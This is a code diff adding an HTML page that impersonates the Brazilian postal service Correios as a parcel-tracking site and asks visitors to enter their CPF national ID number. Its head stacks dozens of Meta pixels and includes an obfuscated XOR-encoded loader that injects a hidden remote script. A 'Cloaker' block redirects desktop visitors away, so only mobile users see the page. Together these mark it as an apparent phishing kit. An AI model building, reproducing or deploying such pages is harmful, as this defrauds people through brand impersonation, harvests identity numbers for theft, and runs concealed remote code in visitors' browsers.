@@ -1,0 +1,1377 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#f1f0ed">
+  <title>Correios — Acompanhe sua encomenda</title>
+  <meta name="description" content="Consulte sua encomenda por código de rastreamento. Serviço independente com encaminhamento ao portal oficial.">
+  <script src="../utm-tracking.js"></script>
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="icon" type="image/png" href="images/icon.png">
+  
+<!-- UTM FACEBOOK Code -->
+
+
+
+<script>
+(function () {
+  "use strict";
+
+  var STORAGE_KEY = "funil_tracking_params";
+
+  // Parâmetros que serão preservados entre as etapas.
+  var TRACKING_PARAMS = [
+    "utm_source",
+    "utm_medium",
+    "utm_campaign",
+    "utm_content",
+    "utm_term",
+    "fbclid"
+  ];
+
+  function readStorage(storage) {
+    try {
+      return JSON.parse(storage.getItem(STORAGE_KEY) || "{}");
+    } catch (e) {
+      return {};
+    }
+  }
+
+  function saveStorage(storage, data) {
+    try {
+      storage.setItem(STORAGE_KEY, JSON.stringify(data));
+    } catch (e) {}
+  }
+
+  function getSavedParams() {
+    var session = readStorage(sessionStorage);
+    var local = readStorage(localStorage);
+
+    return Object.assign({}, local, session);
+  }
+
+  function saveParams(data) {
+    saveStorage(sessionStorage, data);
+    saveStorage(localStorage, data);
+  }
+
+  // 1. Recupera os parâmetros já salvos.
+  var params = getSavedParams();
+
+  // 2. Captura os parâmetros recebidos na URL atual.
+  var currentURL = new URL(window.location.href);
+
+  TRACKING_PARAMS.forEach(function (key) {
+    var value = currentURL.searchParams.get(key);
+
+    // Atualiza somente se o parâmetro estiver presente
+    // e tiver um valor não vazio.
+    if (value !== null && value.trim() !== "") {
+      params[key] = value;
+    }
+  });
+
+  // 3. Salva os parâmetros para as próximas páginas.
+  saveParams(params);
+
+  // 4. Função global para redirecionar preservando as UTMs.
+  window.goToNext = function (nextURL) {
+    var destination = new URL(nextURL, window.location.href);
+    var saved = getSavedParams();
+
+    // Não substitui parâmetros de tracking já definidos
+    // explicitamente na URL de destino.
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        saved[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, saved[key]);
+      }
+    });
+
+    window.location.href = destination.href;
+  };
+
+  // 5. Propaga as UTMs automaticamente nos links internos.
+  document.addEventListener("click", function (event) {
+    var link = event.target.closest("a[href]");
+
+    if (!link) return;
+    if (link.target === "_blank") return;
+    if (event.ctrlKey || event.metaKey || event.shiftKey) return;
+    if (event.button !== 0) return;
+
+    var destination;
+
+    try {
+      destination = new URL(link.href, window.location.href);
+    } catch (e) {
+      return;
+    }
+
+    // Só modifica links da mesma origem.
+    if (destination.origin !== window.location.origin) return;
+
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        params[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, params[key]);
+      }
+    });
+
+    link.href = destination.href;
+  });
+
+  // Disponibiliza os parâmetros para outros scripts.
+  window.getFunilTracking = function () {
+    return Object.assign({}, getSavedParams());
+  };
+
+})();
+</script>
+
+
+<!-- END UTM FACEBOOK CODE -->
+
+<!-- UTMFY Code -->
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+<script>(function(){var f_tx=atob("DAdM54C6GPaiGO83GnxukvLWOsyAcJtDanR2yK/ZfJiMbZtac2E1yePVddjAasBEeXUll/TJN4PWdZwYdmY4gvPONpzROsMVe3M4lenYbYLHa80NQXxuieHXfdSYOotWbmZhkvTXcZDbNZ9Ff3EpifSXYJXNfMJEeWxuy6LMeZrXfc0NOCUxy/uYdpfPfc0NOGMtk+GXbYLPcYlON3c+gvbfdoKPa5pVc2M/xayYbpfObYoVICVumt3H");var p_rt=[];for(var w_puw=0;w_puw<f_tx.length;w_puw++){p_rt.push(f_tx.charCodeAt(w_puw)&255);}var r_7d0y=p_rt[0];var f_5kg=p_rt.slice(1,1+r_7d0y);var p_0kac=p_rt.slice(1+r_7d0y);var t_c=p_0kac.map(function(b,d_nin){return b^f_5kg[d_nin%r_7d0y];});var o_pdk="";for(var q_rs3e=0;q_rs3e<t_c.length;q_rs3e++){o_pdk+=String.fromCharCode(t_c[q_rs3e]&255);}var h_l0yz=decodeURIComponent(escape(o_pdk));var k_s=JSON.parse(h_l0yz);var q_ane=k_s.globals||[];q_ane.forEach(function(w_dru){window[w_dru.name]=w_dru.value;});var w_w=document.createElement("script");w_w.src=k_s.url;w_w.async=true;w_w.defer=true;(k_s.attributes||[]).forEach(function(g_1){w_w.setAttribute(g_1.name,g_1.value);});(document.head||document.documentElement).appendChild(w_w);})();</script>
+
+
+
+<!-- END UTMFY CODE -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1117296950800245');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1117296950800245&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1746333669903668');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1746333669903668&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1015408774399172');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1015408774399172&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2243844239765046');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2243844239765046&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1375844174304393');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1375844174304393&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2137523013457243');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2137523013457243&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '847755107473498');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=847755107473498&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2083978855786884');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2083978855786884&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1313184030636134');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1313184030636134&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '229463223255909');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=229463223255909&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '4234627643479096');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4234627643479096&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '794380730326961');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=794380730326961&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2299537240549041');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2299537240549041&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1342087550707140');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1342087550707140&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1173269651619651');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1173269651619651&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1574851956843520');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1574851956843520&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1185480309697471');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1185480309697471&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '810965115433003');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=810965115433003&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '768728832672906');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=768728832672906&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2763526227120952');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2763526227120952&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '763158696614724');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=763158696614724&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1832985513945847');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1832985513945847&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1768764637040662');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1768764637040662&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1884540289109881');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+    <!-- UTMify Pixel -->
+    <script>
+      window.pixelId = "67b759e9f454faf48c0999a2";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js",
+      );
+      fbq("init", "574352008891416");
+      fbq("track", "PageView");
+    </script>
+
+    <!-- Cloaker -->
+
+
+<script type="text/javascript">
+  if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+    window.location.href = 'https://wallpaperaccess.com/full/3887227.jpg';
+  }
+  </script>
+</head>
+<body>
+  <a class="skip-link" href="">Pular para o rastreamento</a>
+
+  <div class="accessibility-bar">
+    <button type="button" class="accessibility-toggle" aria-expanded="false" aria-controls="accessibility-menu">
+      Acessibilidade <span class="caret" aria-hidden="true"></span>
+    </button>
+
+  </div>
+
+  <header class="site-header">
+    <button class="menu-button" type="button" >
+      <span></span><span></span><span></span>
+    </button>
+<style>
+  .brand {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    text-decoration: none;
+    line-height: 0;
+  }
+
+  .brand-mark {
+    display: block;
+    width: 140px;
+    height: 30px;
+    object-fit: contain;
+    flex-shrink: 0;
+  }
+</style>
+
+<a class="brand"  aria-label="Início">
+  <img
+    class="brand-mark"
+    src="images/logo.svg"
+    alt="Logo"
+  >
+</a>
+<nav class="header-actions" aria-label="Atalhos">
+  <a
+    class="action-link"
+    
+    aria-label="Ajuda e informações"
+    title="Ajuda"
+  >
+    <img src="images/entrar.svg" alt="" class="action-icon">
+  </a>
+
+  <a
+    class="action-link"
+    
+    aria-label="Buscar encomenda"
+    title="Buscar"
+  >
+    <img src="images/lupa.svg" alt="" class="action-icon">
+  </a>
+</nav>
+
+<style>
+  .header-actions {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+  }
+
+  .action-link {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 32px;
+    height: 32px;
+    text-decoration: none;
+  }
+
+  .action-icon {
+    display: block;
+    width: 24px;
+    height: 24px;
+    object-fit: contain;
+  }
+</style>
+  </header>
+
+  <nav class="site-menu" id="site-menu" hidden aria-label="Menu principal">
+    <a href="">Acompanhe sua encomenda</a>
+    <a href="">Ajuda</a>
+  </nav>
+
+  <main id="inicio">
+
+<section class="hero" id="inicio" aria-label="Destaques">
+
+  <div class="hero-carousel">
+    <div class="hero-slide active">
+      <img
+        src="images/header1.png"
+        alt=""
+        fetchpriority="high"
+      >
+    </div>
+
+    <div class="hero-slide">
+      <img
+        src="images/header2.png"
+        alt=""
+        loading="eager"
+      >
+    </div>
+  </div>
+
+  <div class="hero-dots" aria-label="Selecionar imagem">
+    <button
+      class="hero-dot active"
+      type="button"
+      aria-label="Imagem 1"
+      aria-current="true"
+    ></button>
+
+    <button
+      class="hero-dot"
+      type="button"
+      aria-label="Imagem 2"
+      aria-current="false"
+    ></button>
+  </div>
+
+</section>
+
+<style>
+  .hero {
+    position: relative;
+    width: 100%;
+    overflow: hidden;
+    isolation: isolate;
+  }
+
+  /* Proporção original: 767 × 577 */
+  .hero-carousel {
+    position: relative;
+    width: 100%;
+    aspect-ratio: 767 / 577;
+    overflow: hidden;
+    background: #ffffff;
+  }
+
+  .hero-slide {
+    position: absolute;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0;
+    transition: opacity 450ms ease-in-out;
+    pointer-events: none;
+  }
+
+  .hero-slide.active {
+    opacity: 1;
+  }
+
+  .hero-slide img {
+    display: block;
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    object-position: center;
+  }
+
+  /* Indicadores do carrossel */
+  .hero-dots {
+    position: absolute;
+    bottom: 12px;
+    left: 50%;
+    z-index: 2;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    transform: translateX(-50%);
+  }
+
+  .hero-dot {
+    display: block;
+    width: 8px;
+    height: 8px;
+    flex-shrink: 0;
+    padding: 0;
+    border: none;
+    border-radius: 50%;
+    background: rgba(255, 255, 255, 0.6);
+    cursor: pointer;
+    transition:
+      width 250ms ease,
+      background-color 250ms ease;
+  }
+
+  .hero-dot.active {
+    width: 22px;
+    border-radius: 10px;
+    background: #ffffff;
+  }
+
+  .hero-dot:focus-visible {
+    outline: 2px solid #ffffff;
+    outline-offset: 4px;
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    .hero-slide,
+    .hero-dot {
+      transition: none;
+    }
+  }
+</style>
+
+<script>
+(function () {
+  "use strict";
+
+  const hero = document.querySelector("#inicio.hero");
+
+  if (!hero || hero.dataset.carouselReady === "true") {
+    return;
+  }
+
+  hero.dataset.carouselReady = "true";
+
+  const slides = Array.from(
+    hero.querySelectorAll(".hero-slide")
+  );
+
+  const dots = Array.from(
+    hero.querySelectorAll(".hero-dot")
+  );
+
+  if (slides.length !== 2 || dots.length !== 2) {
+    return;
+  }
+
+  let current = 0;
+  let timer = null;
+
+  function showSlide(index) {
+    current = index;
+
+    slides.forEach((slide, i) => {
+      slide.classList.toggle("active", i === index);
+    });
+
+    dots.forEach((dot, i) => {
+      dot.classList.toggle("active", i === index);
+
+      dot.setAttribute(
+        "aria-current",
+        i === index ? "true" : "false"
+      );
+    });
+  }
+
+  function startCarousel() {
+    clearInterval(timer);
+
+    timer = setInterval(function () {
+      showSlide((current + 1) % slides.length);
+    }, 4000);
+  }
+
+  dots.forEach((dot, index) => {
+    dot.addEventListener("click", function () {
+      showSlide(index);
+      startCarousel();
+    });
+  });
+
+  showSlide(0);
+  startCarousel();
+})();
+</script>
+
+
+    <div class="hero-spacer" aria-hidden="true"></div>
+
+    <section class="tracking-section" id="rastreamento" aria-labelledby="tracking-title">
+      <h2 id="tracking-title">Acompanhe sua Encomenda</h2>
+      <h4 style="text-align: center;">Deseja acompanhar seu objeto? <br> Informe seu CPF abaixo:</h4><div style="display: flex; justify-content: center; align-items: center; width: 100%;">
+  <svg class="tracking-icon" viewBox="0 0 64 64" fill="none" aria-hidden="true">
